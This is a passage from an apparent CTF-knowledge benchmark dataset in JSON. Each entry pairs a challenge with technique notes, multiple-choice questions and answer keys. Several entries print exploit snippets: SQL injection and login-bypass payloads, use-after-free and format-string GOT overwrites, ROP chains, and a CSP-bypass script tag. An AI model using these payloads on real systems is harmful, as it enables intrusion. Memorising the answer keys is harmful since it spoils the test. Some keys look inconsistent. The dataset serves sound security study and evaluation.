            "When trying to optimize a solution for a set cover problem by sequentially adding a random element not in the solution and removing unnecessary elements, what optimization technique could significantly reduce the time it takes to reach a near-optimal solution? - A. Randomly selecting routers from the entire set for every iteration without any preferential criteria - B. Checking all routers in each iteration for possible removal regardless of their relevance to the latest addition - C. Only reevaluating elements that are in sets affected by the most recent addition to the solution - D. Increasing the size of the solution by keeping all randomly added routers without attempting removals"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Hack into Skynet",
        "write_up": "dataset/raw/Hack into Skynet.md",
        "type": "web",
        "competition": [
            "RealWorld/2022",
            "https://ctftime.org/event/1507/tasks/"
        ],
        "score": 73,
        "max_score": 500,
        "difficulty": 0.146,
        "knowledge": [
            "In scenarios where direct SQL injection is not successful due to backend database implementations (like PostgreSQL), leveraging the application's logic flaws can allow for bypassing authentication mechanisms. Specifically, when a web application does not properly validate user input for authentication, supplying an empty username and a specific password (which undergoes flawed logic processing) can grant access. For instance, using a payload where `username` is left empty and `password` is set to a string that the application's logic erroneously validates as correct (e.g., 'ctf'), can bypass the login system.  \n   Example payload:  \n   ```\n   username=&password=ctf\n   ```",
            "When facing a web application that utilizes PostgreSQL and standard SQL injection payloads do not work, it's essential to tailor the SQL injection attempts to exploit the specific SQL syntax and functions of PostgreSQL. Using string concatenation or utilizing functions and schema information available in PostgreSQL can lead to successful extraction of sensitive information or execution of arbitrary SQL commands. Crafting payloads that incorporate PostgreSQL-specific syntax or functions, such as exploiting the database's information schema tables to retrieve table names, column names, or even data from other tables, can be effective.  \n   Example payload for retrieving information on tables and columns:  \n   ```\n   '; select column_name, null from information_schema.columns where table_name='target' limit 3 offset '0\n   ```"
        ],
        "question": [
            "When attempting to bypass a login system that does not adequately validate user input, which of the following payloads could potentially allow an attacker to bypass the authentication if the application has a logic flaw in processing empty usernames and specific passwords? - A. username=admin&password=admin - B. username=&password=ctf - C. username=OR 1=1&password=OR 1=1 - D. username=NULL&password=NULL",
            "In a scenario where standard SQL injection techniques are ineffective against a PostgreSQL database, which of the following payloads could be most appropriate to exploit the database by utilizing PostgreSQL-specific syntax or functions to retrieve information about columns of a table named 'target'? - A. 'UNION SELECT username FROM users WHERE '1'='1 - B. '; SELECT * FROM users WHERE username='admin - C. '; SELECT version(); -- - D. '; select column_name, null from information_schema.columns where table_name='target' limit 3 offset '0"
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "Hacker Manifesto",
        "write_up": "dataset/raw/Hacker Manifesto.md",
        "type": "The type of this CTF challenge is **forensics**.",
        "competition": [
            "Tenable/2021",
            "https://ctftime.org/event/1266/tasks/"
        ],
        "score": 250,
        "max_score": 250,
        "difficulty": 1.0,
        "knowledge": [
            "When analyzing encoded or obfuscated files that seem to contain ASCII text interleaved with non-readable bytes, examining raw bytes using tools like `hd` or `xxd` can provide insights into patterns and data structures embedded within. Filtering characters based on their appearance order or decoding based on byte position manipulation can reveal hidden messages or data.\n   - Example payload extraction technique: Review the hex dump and look for patterns such as every nth byte being meaningful or needing to adjust byte values based on their positions to decode text correctly.",
            "In scenarios where encoded data seems to follow a pattern involving arithmetic manipulations or offsets, consider the possibility that parts of the data may be indicating how to retrieve or reconstruct missing parts. Specifically, if an encoding scheme indicates a back-reference within the data (i.e., referring to previously encountered characters or sequences) with additional arithmetic operations (like division or modulus) to fine-tune the reference, implementing logic to decode based on these hints can be crucial.\n   - Example C++ code snippet to decode:\n     ```c++\n     // Assuming 'a' is the back-reference indicator and 'b' might include additional instructions (such as division or use of modulus for further adjustment)\n     if (a != 0) {  \n       lookback = a + (b % 4 != 0 ? 256 : 0); // Adjusting the look-back based on 'b'\n       temp = res.size() - lookback;  \n       for(int i = 0; i < b/4; ++i)              \n         res.push_back(res[temp + i]); // Reconstructing the text by back-referencing  \n     }  \n     res.push_back(c); // 'c' represents the current character to append\n     ```"
        ],
        "question": [
            "When attempting to analyze a file containing a mix of ASCII characters and non-readable bytes to uncover hidden messages, which tool can be most effective for revealing patterns or embedded data structures by examining raw bytes? - A. Microsoft Word - B. Adobe Photoshop - C. Hexdump (`hd`) or `xxd` - D. Microsoft Paint ",
            "In the context of implementing a decoding mechanism for encoded data that incorporates back-references and arithmetic manipulations, which of the following segments best demonstrates how to adjust a look-back reference dynamically based on specific conditions encountered in the input stream? - A. `if (a != 0) {lookback = b + c;}` - B. `if (a != 0) {lookback = a + (b % 4 != 0 ? 256 : 0);}` - C. `if (a == 0) {lookback = a - b;}` - D. `if (b != 0) {lookback = a / b;}` "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "HackIM Shop",
        "write_up": "dataset/raw/HackIM Shop.md",
        "type": "pwn",
        "competition": [
            "nullconHackIM/2019",
            "https://ctftime.org/event/741/tasks/"
        ],
        "score": 458,
        "max_score": 500,
        "difficulty": 0.916,
        "knowledge": [
            "When exploiting a Use-After-Free (UAF) vulnerability, the allocation and deallocation of objects can be manipulated to corrupt the memory and gain unauthorized access or disclosure of information. Specifically, if the program involves an array or list structure (e.g., `books` in the binary) to store dynamically allocated objects, freeing an object without removing its reference from the array can allow an attacker to later reuse or reference the freed object for arbitrary read or write operations. This manipulation can be utilized to overwrite pointers, such as GOT table entries for controlling code execution or leaking memory addresses. In the presented scenario, the bug was exploited by first adding and then deleting a series of objects (books), followed by reallocating objects to control the content of previously freed memory, leading to information disclosure and code execution.\n\nExample payload to exploit UAF for memory leak or code execution:\n```python\n# Allocate objects\nfor i in range(NUM_OBJECTS):\n    addBook(50, 5, str(i)*50)\n\n# Free objects to create dangling pointers\nfor i in range(NUM_OBJECTS):\n    deleteBook(i)\n\n# Reallocate objects to control freed memory\naddBook(50, 5, controlled_content)\n```",
            "A format string vulnerability occurs when user-controlled input is passed directly to a formatting function (e.g., `printf`) without proper formatting directives, enabling an attacker to read from or write to arbitrary memory locations. This flaw can be exploited by supplying format specifiers (e.g., `%s`, `%n`) in the input, potentially leading to arbitrary code execution or sensitive information disclosure. In the binary discussed, the flaw was used to leak a libc address by overwriting a pointer to print it and then to write the address of the `system` function into the GOT entry of `free`, transforming a call to `free` into a call to `system(\"/bin/sh\")`. This particular exploitation required precise control of the payload to manipulate memory addresses and format string outputs to achieve the desired effect.\n\nExample payload to exploit format string vulnerability for writing arbitrary values:\n```python\n# Calculate parts of the address to write\npart0 = str(leak & 0xffff)\npart1 = str((leak & 0xffff0000) >> 16)\npart2 = str((leak & 0xffff00000000) >> 32)\n\n# Use the format string vulnerability to write to GOT\naddBook(\"50\", \"5\", controlled_ptr + \"%\" + part0 + \"x%7$n\")\naddBook(\"50\", \"5\", controlled_ptr + \"%\" + part1 + \"x%7$n\")\naddBook(\"50\", \"5\", controlled_ptr + \"%\" + part2 + \"x%7$n\")\n```"
        ],
        "question": [
            "In a challenge where the exploitation of a Use-After-Free (UAF) vulnerability is required, considering a scenario where objects such as books are added and removed from a cart, which of the following sequences correctly demonstrates the steps an attacker would take to exploit this vulnerability for unauthorized memory manipulation or information disclosure?  - A. Allocate memory for multiple books, deallocate some books, and then overwrite the memory of the deallocated books without reallocating new ones. - B. Allocate memory for multiple books, modify the content of existing books without deallocating any, and attempt to read unauthorized memory areas. - C. Deallocation of all books followed by immediate reallocation of new books to prevent dangling pointers from being exploited. - D. Allocate memory for multiple books, deallocate some of them to create dangling pointers, and then reallocate objects to manipulate the content of previously freed memory. ",
            "In the context of exploiting a format string vulnerability in a binary challenge, where the objective is to manipulate the Global Offset Table (GOT) and perform arbitrary code execution, which option demonstrates the correct approach to exploit this vulnerability, given a scenario where the attacker can control the input to a `printf` call through a book name?  - A. Provide a static string as input without any format specifiers and expect the binary to execute arbitrary code automatically. - B. Use non-related format specifiers in the payload that do not match the memory addresses or values to be written or leaked. - C. Supply a carefully crafted payload containing specific format specifiers and values to overwrite memory addresses in the GOT with the address of `system`, thereby executing arbitrary commands. - D. Avoid using any format specifiers and rely solely on natural program execution flow to achieve code execution or information leak. "
        ],
        "answer": [
            "D",
            "C"
        ]
    },
    {
        "name": "Halloweened",
        "write_up": "dataset/raw/Halloweened.md",
        "type": "crypto",
        "competition": [
            "Square/2023",
            "https://ctftime.org/event/2111/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When dealing with anti-debugging techniques in CTF challenges involving macOS binaries, it is crucial to identify and neutralize Mach exception ports-based anti-debugging. This can typically be overcome by following existing guides on handling Mach exception ports, where the task is to prevent the binary from altering its control flow in response to a debugger presence. A targeted solution involves examining the use of `task_get_exception_ports` and applying knowledge from sources like Alex O'Mara's blog on defeating macOS anti-debug techniques. This is especially useful in scenarios where a binary employs this method as its sole anti-debugging trick.",
            "In challenges requiring the parsing of system libraries and symbols, understanding the relationship between different libraries can lead to the discovery of encryption keys or other critical data. Specifically, navigating from one library to another (e.g., libxpc.dylib to libobjc.dylib) and applying a CRC function or similar algorithm to their exported symbols could reveal hidden information such as encryption keys. A practical approach is to enumerate all symbols within the target libraries and apply the given CRC or similar function to uncover secret keys, such as `__NXReallyFree` in the context of decrypting AES ECB encrypted data. This technique is applicable in scenarios where the challenge involves Dynamic Library linking and symbol enumeration within macOS binaries."
        ],
        "question": [
            "When analyzing a macOS binary for anti-debug techniques, which of the following methods is crucial for addressing Mach exception ports-based anti-debugging, as demonstrated by defeating `task_get_exception_ports` checks?  - A. Modifying the binary to bypass Mach exception checks. - B. Using a kernel module to intercept exception messages. - C. Following external guides, such as Alex O'Mara's blog, on handling and defeating Mach exception ports techniques. - D. Implementing custom exception handlers within the debugger. ",
            "In a CTF challenge that involves parsing system libraries from a macOS binary to uncover encryption keys, which approach is effective for navigating from `libxpc.dylib` to `libobjc.dylib` and discovering the key `__NXReallyFree`?  - A. Directly searching the memory for the string `__NXReallyFree` without applying any CRC or comparison functions. - B. Manually inspecting each library file for the presence of known encryption keys. - C. Applying a specified CRC function on symbols enumerated within `libobjc.dylib` to match against a known secret key. - D. Decompiling both libraries to source code to visually identify the secret key. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Hamul",
        "write_up": "dataset/raw/Hamul.md",
        "type": "crypto",
        "competition": [
            "Crypto/2021",
            "https://ctftime.org/event/1258/tasks/"
        ],
        "score": 83,
        "max_score": 477,
        "difficulty": 0.1740041928721174,
        "knowledge": [
            "In RSA challenges where the modulus \\(n\\) is constructed from primes with a special structure or relationship, one can reverse-engineer the prime generation process by analyzing the structure of \\(n\\). This is particularly useful in cases where the primes are concatenated in a specific pattern that can be partially deduced from the known parts of \\(n\\). This method relies on the specific construction of \\(n\\) from the primes, which may involve operations like concatenation of the prime numbers or their representations.",
            "When an RSA modulus \\(n\\) is known to be constructed from primes generated through a complex or pattern-based method, brute-forcing a small, unknown part of the primes might be feasible. This approach is significantly more effective if the structure of \\(n\\) reveals parts of the concatenated primes, reducing the brute-force space to a manageable size. For example, if the high and low parts of \\(n\\) are known and only a small portion in the middle is unknown, one can generate probable values of the product of the primes and attempt to factor it to retrieve the original primes.\n   \n   - Example of generating probable values for brute-forcing:\n     ```python\n     low = str(n)[-18:]\n     high = str(n)[:18]\n     pq_prob = []\n     for i in range(10):\n         for j in range(10):\n             pq_prob.append(int(high + str(i) + str(j) + low))\n     ```"
        ],
        "question": [
            "In a scenario where the RSA modulus \\(n\\) is derived from primes having a special relationship, specifically where parts of the prime numbers are concatenated to form \\(n\\), how does this peculiar structure aid in the process of deducing the original primes used in the creation of \\(n\\)? - A. It allows for the direct calculation of the private key without needing the prime factors. - B. It provides a basis for applying standard factorization algorithms more efficiently. - C. It enables reverse-engineering the generation process by analyzing the structure of \\(n\\) to partially deduce the concatenated primes. - D. It simplifies the encryption process by making the public exponent irrelevant.",
            "In a challenge where an RSA modulus \\(n\\) is composed from primes following a specific pattern, leading to a scenario where only a small portion of the primes is unknown, which method is considered feasible for recovering the original primes? - A. Using quantum computing to directly factor \\(n\\) into its prime components. - B. Applying a brute-force approach to the entire range of possible prime numbers until the correct ones are found. - C. Generating probable values for the unknown part of the primes by brute-forcing, given the known high and low parts of \\(n\\), to then factor these values and retrieve the original primes. - D. Reverse-engineering the public key to deduce the private key, thus making the prime recovery process irrelevant."
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Hanukkah",
        "write_up": "dataset/raw/Hanukkah.md",
        "type": "crypto",
        "competition": [
            "X-MAS/2018",
            "https://ctftime.org/event/724/tasks/"
        ],
        "score": 50,
        "max_score": 591,
        "difficulty": 0.08460236886632826,
        "knowledge": [
            "In the context of decrypting ciphertexts encrypted with the Rabin cryptosystem, one can attempt to reverse-engineer the key generation logic if the public key (N) was derived from polynomials of a specific structure. This involves guessing or calculating the hidden variables (e.g., r) used in these polynomials to then derive the prime factors (p and q) of N. This approach is particularly viable if the coefficients of the polynomials are relatively small, allowing the calculation of the roots.",
            "For decryption using the Rabin cryptosystem when p = q = 3 (mod 4), the square roots of the ciphertext modulo p and modulo q can be efficiently computed using the formula:\n   \\[\n   \\sqrt{c} \\bmod p = c^{(p+1)/4} \\bmod p\n   \\]\n   \\[\n   \\sqrt{c} \\bmod q = c^{(q+1)/4} \\bmod q\n   \\]\n   This results in four potential candidates for the plaintext message. The correct candidate can often be identified through known plaintext characteristics, such as specific padding at the end of the message."
        ],
        "question": [
            "In the scenario of decrypting a ciphertext encrypted with the Rabin cryptosystem, assuming the public key \\(N\\) is derived from polynomials with relatively small coefficients leading to an equation of the form \\(N = 51r^4 + 88r^3 + 128680r^2 + 134636r + 9816209\\), what is the appropriate method to recover the hidden variable \\(r\\)? - A. Solve for \\(r\\) by finding the roots of \\(N\\) as a polynomial equation directly. - B. Compute \\(r\\) as the integer square root of \\(N\\) directly. - C. Determine \\(r\\) by calculating the fourth root of \\(N - 9816209\\). - D. Recover \\(r\\) by applying the Euclidean algorithm to \\(N\\).",
            "Using the Rabin cryptosystem for decryption, when both \\(p\\) and \\(q\\) are congruent to 3 modulo 4, which formula should be used to efficiently compute the square roots of the ciphertext (\\(ct\\)) modulo \\(p\\) and modulo \\(q\\)? - A. \\(\\sqrt{ct} \\mod p = ct^{(2p+1)/4} \\mod p\\) - B. \\(\\sqrt{ct} \\mod q = ct^{(q+3)/4} \\mod q\\) - C. \\(\\sqrt{ct} \\mod p = ct^{(p+1)/4} \\mod p\\) - D. \\(\\sqrt{ct} \\mod q = ct^{(2q-1)/4} \\mod q\\)"
        ],
        "answer": [
            "C.",
            "C."
        ]
    },
    {
        "name": "Happy Fun Binary Pt",
        "write_up": "dataset/raw/Happy Fun Binary Pt.1.md",
        "type": "crypto",
        "competition": [
            "Square/2020",
            "https://ctftime.org/event/1174/tasks/"
        ],
        "score": -1.0,
        "max_score": 300,
        "difficulty": -1,
        "knowledge": [
            "When exploiting stack overflow vulnerability to execute ROP chain for privilege escalation, identify gadgets in the binary using tools like `ropper` to manipulate registries and control the flow. Utilize `one_gadget` with the `libc` provided to find the easiest path to spawn a shell if constraints can be met or groomed. \n\n   - For setting a specific register (e.g., %rdi for argument setup) before calling a function like `puts`, use found gadgets: \n     ```\n     pop_rdi = base_address + 0x00000000000013a3; // gadget found in binary\n     payload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt)\n     ```\n   \n   - When direct `one_gadget` constraints cannot be met, find additional gadgets to zero out required registers:\n     ```\n     pop_rsi = libc_base + 0x0000000000027529;\n     pop_rdx_pop_r12 = libc_base + 0x000000000011c371;\n     payload += p64(pop_rsi) + p64(0) + p64(pop_rdx_pop_r12) + p64(0) + p64(0) + p64(one_gadget)\n     ```",
            "To exploit a side-channel timing attack in HMAC verification, observe the difference in response times corresponding to each byte of the HMAC to determine the correct value. Incrementally construct the correct HMAC byte-by-byte by identifying the longest response time for each byte. This method requires patience and possibly multiple iterations to correct for anomalies in measured response times. \n\n   - Example methodology (pseudo-code):\n     ```\n     for each byte_index in HMAC:\n       for each possible_byte_value from 0 to 255:\n         measure_response_time(send_attempt_with_byte_value)\n         if response_time > maximum_found_time:\n           HMAC[byte_index] = possible_byte_value\n           update maximum_found_time\n       confirm_byte_value_at_index(byte_index, HMAC[byte_index])\n     ```"
        ],
        "question": [
            "In an exploitation scenario involving a stack overflow vulnerability and ROP chain for privilege escalation, with the aim to execute a shell by dynamically finding and utilizing gadgets through binary analysis tools, which action is correct for setting up the argument for a function call (e.g., the `puts` function) using a gadget found within the binary?  - A. Use a \"pop rsp\" gadget to set the stack pointer to the address of the `puts` GOT entry. - B. Use a \"push rdi\" gadget followed by a direct jump to the `puts` function pointer. - C. Use a \"pop rdi; ret;\" gadget to place the address of the Global Offset Table (GOT) entry for `puts` into the RDI register. - D. Directly overwrite the return address with the address of the `puts` function in the binary. ",
            "In the context of exploiting a timing side-channel vulnerability in HMAC verification, which approach is accurate for incrementally constructing the correct HMAC value based on differential response times indicating the verification process's progress?  - A. Sequentially verify each bit of the HMAC, starting with the least significant bit, and look for the fastest response time to identify correct bits. - B. Simultaneously send all possible HMAC values in a single request and determine the correct HMAC from the response time. - C. Scan through each byte of the HMAC, for each byte testing all possible values (0-255), and select the value that results in the longest response time indicative of the correct match. - D. Randomly guess the HMAC value and compare the server's response time to a baseline to determine if the guess is closer to the correct value. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Happy Fun Binary Pt",
        "write_up": "dataset/raw/Happy Fun Binary Pt.2.md",
        "type": "reverse",
        "competition": [
            "Square/2020",
            "https://ctftime.org/event/1174/tasks/"
        ],
        "score": -1.0,
        "max_score": 300,
        "difficulty": -1,
        "knowledge": [
            "When facing a binary challenge that dynamically loads a shared object library, using a wrapper can simulate the environment for reversing or debugging. This approach is particularly useful for understanding the flow of execution in scenarios where direct execution is not possible or practical. The wrapper should load the shared library, resolve the necessary symbols (functions), and then call these functions according to the challenge's requirements. Example of a wrapper code snippet in C:\n```\n// gcc -m32 wrapper.c -o wrap -ldl\n#include <stdlib.h>  \n#include <dlfcn.h>  \nint main()  \n{  \n   void *h;  \n   void *(*f)();  \n   h = dlopen(\"./binary_of_ballas.so\", RTLD_LAZY);  \n   f = (void *(*)())dlsym(h, \"foyer\");  \n   f();  \n   dlclose(h);  \n   return 0;  \n}  \n```",
            "To reverse a binary challenge involving complex mathematical operations (e.g., extended precision floating-point calculations), Python libraries like gmpy2 can be instrumental. These libraries support high precision arithmetic operations, making them suitable for reconstructing and understanding algorithmic behavior, especially when dealing with encryption or encoding mechanisms. A practical method involves translating the binary's logic into equivalent Python code using these libraries, facilitating the reverse engineering process to derive values or flags from given conditions or inputs. Sample Python code snippet utilizing gmpy2 for arithmetic operations:\n```\nimport gmpy2  \nfrom gmpy2 import mpfr as f  \ngmpy2.get_context().precision=100\n\ndef float80(x):  \n   # Conversion logic here\n   return gmpy2.mul(s, res)\n\n# Example usage in an encoding function\ndef encode(f1, f2, flag, five):  \n   # Encoding logic here\n   return res\n```"
        ],
        "question": [
            "In a scenario where you need to dynamically load a shared object library into a C-based wrapper for analysis, which flag is correctly passed to `dlopen` to ensure lazy loading of symbols? - A. `RTLD_NOW` - B. `RTLD_GLOBAL` - C. `RTLD_LAZY` - D. `RTLD_LOCAL`",
            "When implementing a mathematical algorithm in Python that requires precision higher than what regular floating-point operations can offer, especially for tasks like simulating extended precision float calculations found in binary challenge analysis, which library and function is most appropriate to achieve this precision? - A. Using `math` library and its `pow` function for precision. - B. Using `numpy` library and its `array` function for extended precision. - C. Using `decimal` library and its `Decimal` function for precision. - D. Using `gmpy2` library and the function `mpfr` for setting precision."
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "Happy Fun Binary Pt",
        "write_up": "dataset/raw/Happy Fun Binary Pt.3.md",
        "type": "reverse",
        "competition": [
            "Square/2020",
            "https://ctftime.org/event/1174/tasks/"
        ],
        "score": -1.0,
        "max_score": 300,
        "difficulty": -1,
        "knowledge": [
            "When faced with a challenge involving the comparison of input against random outcomes where the randomness pattern is fixed (due to a hardcoded seed), determining the seed can allow for the prediction of each comparison outcome. This enables the creation of a script to bruteforce or calculate the correct input by simulating each conditional path.  \nExample concept: Using a known seed value (0x7a69 in the challenge) to predict the results of rand()%3 over the course of input validation.",
            "In binary analysis challenges, when the execution mode changes (e.g., from 32 bits to 64 bits) and traditional debugging tools (like gdb) become ineffective, tooling that can handle multiple architectures (like Capstone for disassembly) can be employed to understand and reverse the binary's functionality. This is particularly useful in situations where direct analysis of the binary code is required to understand and manipulate its behavior.  \nExample concept: Using Capstone to disassemble parts of the binary that are executed in a different mode (64 bits) than the default execution mode, helping in the analysis of complex functions or changes in execution flow."
        ],
        "question": [
            "In a challenge where the correct input is verified through multiple random outcomes dictated by a hardcoded seed, how can the correct input be determined by simulating the effect of the seed on the random number generator function? - A. By changing the seed on every attempt to make the outcomes more predictable. - B. By statically analyzing the binary to identify hard-coded values that could be seeds. - C. By using the identified seed (e.g., 0x7a69) to predict the sequence of random outcomes (e.g., 0, 1, 2) and simulate each conditional path for input verification. - D. By ignoring the seed and focusing solely on reverse engineering of input validation logic without considering the randomness aspect.",
            "In a binary analysis challenge where direct debugging is hindered due to a change in execution mode (from 32 to 64 bits), which tooling approach offers a viable solution for disassembling and understanding the binary's functionality in the new execution mode? - A. Using GDB with additional plugins to force it into correctly parsing binary sections that are in a different execution mode. - B. Employing Capstone to disassemble the binary parts executed in a different mode (e.g., 64 bits), thus understanding complex functions or execution flow changes. - C. Ignoring the execution mode change and using traditional debugging tools with brute force methods to analyze the binary behavior. - D. Using high-level scripting languages like Python to manually interpret and execute binary code sections without actual disassembly."
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Hash My Awesome Commands",
        "write_up": "dataset/raw/Hash My Awesome Commands.md",
        "type": "The type of challenge described in the write-up is **crypto**.",
        "competition": [
            "Square/2020",
            "https://ctftime.org/event/1174/tasks/"
        ],
        "score": 150,
        "max_score": 300,
        "difficulty": 0.5,
        "knowledge": [
            "When facing HMAC verification as part of a CTF challenge, timing attacks can be used if the comparison function introduces variable delays. If the verification function uses timing differences to compare each byte of the HMAC, these can be exploited by measuring how long the server takes to respond to input with incorrect HMACs. By carefully crafting inputs and measuring response times, attackers can incrementally guess the correct HMAC one byte at a time.",
            "To exploit timing-based vulnerabilities in HMAC verifications, a brute force attack can be methodically conducted by starting with a base64-decoded dummy HMAC and incrementing each byte, observing the time taken for the server to respond. By comparing these times against expected delay intervals (as given by the server's timing function), the correct HMAC byte values can be deduced. This requires precise timing measurements and the ability to programmatically adjust and resend payloads based on the server's response times."
        ],
        "question": [
            "When implementing a custom HMAC verification function that compares HMACs byte-by-byte using go routines and introduces deliberate delays to each byte comparison, what vulnerability may be introduced? - A. The HMAC verification function is immune to all forms of attack due to the use of strong cryptographic hashing. - B. By introducing fixed delays in the verification process, it may lead to a denial of service (DoS) attack due to increased processing time. - C. This approach can introduce a timing attack vulnerability, as attackers could measure the time it takes to receive a response and deduce the correct HMAC byte by byte. - D. Execution of go routines for byte comparison may result in race conditions that compromise the secret key.",
            "In a scenario where an attacker is attempting to exploit a timing vulnerability in an HMAC verification process by starting with a base64-decoded dummy HMAC and incrementally guessing each byte based on response times, what is the attacker most likely exploiting? - A. The attacker is exploiting the inherent weakness in base64 encoding which does not provide confidentiality or integrity checks. - B. They are exploiting the timing differences introduced by the application's handling of byte-by-byte comparison in HMAC verification, allowing them to deduce the correct HMAC. - C. The complexity of the cryptographic algorithm used in HMAC is being exploited, as it is known to have vulnerabilities when processed in certain languages. - D. They are taking advantage of network latency fluctuations to intercept and manipulate data packets containing HMACs."
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "hashfunction",
        "write_up": "dataset/raw/hashfunction.md",
        "type": "reverse",
        "competition": [
            "kksctf/2020",
            "https://ctftime.org/event/1112/tasks/"
        ],
        "score": -1,
        "max_score": 411,
        "difficulty": -1,
        "knowledge": [
            "When dealing with custom MD5 hashing algorithms, it's important to analyze and understand the hashing process, especially if the algorithm processes input in chunks and/or applies unique operations to each chunk. This understanding can reveal vulnerabilities or peculiarities useful for crafting an exploit. In this scenario, the password was processed in groups of 4 bytes, and characters beyond a certain length were ignored, which is a critical insight for reverse engineering the hashing function.",
            "Brute force attacks can be practical even against custom hash algorithms if the search space is limited and known. In the challenge, knowing that the password's hash was processed in 4-byte groups and applying little-endian byte order significantly reduced the brute force search space to 256^4 (4294967296) possibilities per group. This approach can be parallelized or optimized further by targeting specific parts of the hashing operation, especially when the final hash values (F's) to compare with are known.\n\nExample payload for a brute force approach:\n```python\nfor a in range(256):\n    for b in range(256):\n        for c in range(256):\n            for d in range(256):\n                F = special_hash_function(a, b, c, d) # Pseudocode for applying the unique operations of the custom hash\n                if F == target_F_value: # Replace target_F_value with the actual targeted hash chunk value\n                    print(f\"Found matching bytes: {a}, {b}, {c}, {d}\")\n                    break\n```\n(Note: The sample payload is conceptual and requires replacing `special_hash_function` and `target_F_value` with the specific function logic and hash values derived from the scenario.)"
        ],
        "question": [
            "In a scenario where a custom MD5 hashing function operates by processing inputs in groups of 4 bytes, and additional characters beyond a certain threshold are ignored, which of the following strategies would be most critical for reverse engineering this hashing function? - A. Focusing on the cryptographic strength of each individual byte. - B. Decoding the function's use of common hashing libraries for insights. - C. Analyzing the algorithm's chunk processing and handling of input length. - D. Calculating the entropy of the output hash to estimate security. ",
            "In the context of executing a brute force attack against a custom hash algorithm that processes password hashes in 4-byte groups with known end hash values (F's), while also employing little-endian byte order, which of the following represents the most feasible approach to significantly reduce the brute force search space? - A. Attacking each byte individually with a search space of 256 possibilities. - B. Applying a generic MD5 collision technique without considering the unique algorithm changes. - C. Targeting each 4-byte group separately with a 256^4 possibilities search space, acknowledging endianness in comparisons. - D. Ignoring the known hash values and endianness, focusing instead on exploiting cryptographic weaknesses in MD5. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "hashishe cryptos",
        "write_up": "dataset/raw/hashishe cryptos.md",
        "type": "crypto",
        "competition": [
            "Blaze/2019",
            "https://ctftime.org/event/790/tasks/"
        ],
        "score": 420,
        "max_score": 420,
        "difficulty": 1.0,
        "knowledge": [
            "In the context of El Gamal encryption, if an attacker is given the ability to encrypt a single arbitrary message using the same parameters as the encrypted flag, they can exploit this by encrypting a known message and comparing the two ciphertexts to extract the flag. The attacker can find the inverse of the known encrypted message and use it to derive the shared secret \\(g^{x \\times y}\\), which can then be used to decrypt the flag with the given parameters.",
            "To exploit El Gamal encryption when given the parameters \\(p\\), \\(g\\), \\(y\\), \\(c1\\), and \\(c2\\) for an encrypted flag and allowed to encrypt an additional message, choose a known message, encrypt it, and calculate the inverse of its encryption. Multiply this inverse with the encrypted flag's \\(c2\\) to extract \\(g^{x \\times y}\\), and then use the inverse of \\(g^{x \\times y}\\) to decrypt \\(c2\\) of the flag. Tools like pwntools for interaction and gmpy for handling mathematical operations are effective for automating this exploitation process.\n\nExample of a simplified pseudo-code to demonstrate the extraction of the flag:\n```python\n# Pseudo-code and does not take into account the actual syntax or library functions exactly.\nimport gmpy2\n\n# Assuming c2_old, c2_new are given from the encryption service, and\n# m' is the known message we have chosen to encrypt (and converted to integer form).\n# c2_old and c2_new refer to the encrypted forms of the original and our chosen message, respectively.\n\n# Calculate the inverse of our message's encryption\ninverse_m_prime = gmpy2.invert(m_prime_encrypted, p)\n\n# Use the inverse to extract the shared secret g^(x * y)\ng_x_y = c2_new * inverse_m_prime % p\n\n# Calculate the inverse of the shared secret\ninverse_g_x_y = gmpy2.invert(g_x_y, p)\n\n# Apply the inverse of the shared secret to the encrypted flag to decrypt it\nflag_decrypted = c2_old * inverse_g_x_y % p\n\n# Convert the decrypted flag from integer to string if necessary\n# print(flag_decrypted) or any suitable method to display or use the flag.\n```"
        ],
        "question": [
            "In the context of El Gamal encryption, when an attacker can encrypt an arbitrary message using the same parameters as a given encrypted flag, what is the crucial step they must perform after encrypting their chosen message to eventually decrypt the flag? - A. Encrypt the chosen message with a different algorithm to increase security. - B. Calculate the inverse of the encryption of their chosen message to derive the shared secret \\(g^{x \\times y}\\). - C. Directly compare the ciphertexts of the encrypted flag and the chosen message without any further calculations. - D. Change the encryption parameters to ensure the inverse calculation is more secure. ",
            "In exploiting the El Gamal encryption weakness given parameters \\(p\\), \\(g\\), \\(y\\), \\(c1\\), and \\(c2\\) of an encrypted flag, and after encrypting an additional message, which tools are recommended for effectively automating the exploitation process, specifically for interaction and handling mathematical operations? - A. TensorFlow for interaction and NumPy for mathematical operations. - B. Wireshark for interaction and MATLAB for mathematical operations. - C. pwntools for interaction and gmpy for handling mathematical operations. - D. Microsoft Excel for interaction and Mathematica for mathematical operations. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "hCorem",
        "write_up": "dataset/raw/hCorem.md",
        "type": "web",
        "competition": [
            "RealWorld/2019/Quals",
            "https://ctftime.org/event/841/tasks/"
        ],
        "score": 304,
        "max_score": 500,
        "difficulty": 0.608,
        "knowledge": [
            "When faced with a Content-Security-Policy (CSP) that restricts resources to the same domain, a possible bypass includes using the vulnerable application's own resources against itself. For instance, re-including the application\u2019s API or script file with a malicious callback function can allow execution of JavaScript even under restrictive CSP rules. This is particularly applicable in situations where the application\u2019s CSP does not restrict dynamic script execution from the source domain.\n   - Example payload: `<script src=\"/api.php/qwq?callback=alert(1)//\"></script>`",
